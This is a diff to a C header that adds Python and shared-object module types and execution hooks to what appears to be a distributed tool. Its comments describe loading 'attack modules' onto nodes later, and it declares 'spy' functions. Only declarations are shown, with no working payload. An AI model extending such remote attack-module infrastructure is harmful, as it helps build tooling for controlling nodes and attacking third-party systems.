@@ -228,6 +228,12 @@ typedef struct _spy_func {
 
 SpyFuncs *SpyGet(Modules *mptr);
 
+// what type of external module  is this?
+enum {
+    MODULE_TYPE_SO,
+    MODULE_TYPE_PYTHON
+};
+
 // modules that can be loaded later so we can distribute and let the nodes build up
 // so attack modules, etc can get loaded later
 typedef struct _external_module {
@@ -235,6 +241,8 @@ typedef struct _external_module {
     char *buf;
     int fd;
     uint32_t start_ts;
+    
+    int type;
     
     int id;
     int size;
@@ -248,8 +256,14 @@ typedef struct _external_module {
     module_func plumbing;
 } ExternalModules;
 
+
+
+
 ExternalModules *ExternalFind(int id);
 int ExternalDeinit(ExternalModules *eptr);
 int ExternalInit(ExternalModules *eptr);
-ExternalModules *ExternalAdd(int id, char *buf, int size, int init);
+int ExternalEnable(ExternalModules *eptr);
+int ExternalDisable(ExternalModules *eptr);
+ExternalModules *ExternalAdd(int type, int id, char *buf, int size, int init);
 void *CustomPtr(Connection *cptr, int custom_size);
+int ExternalExecutePython(int id, char *script, char *func_name);
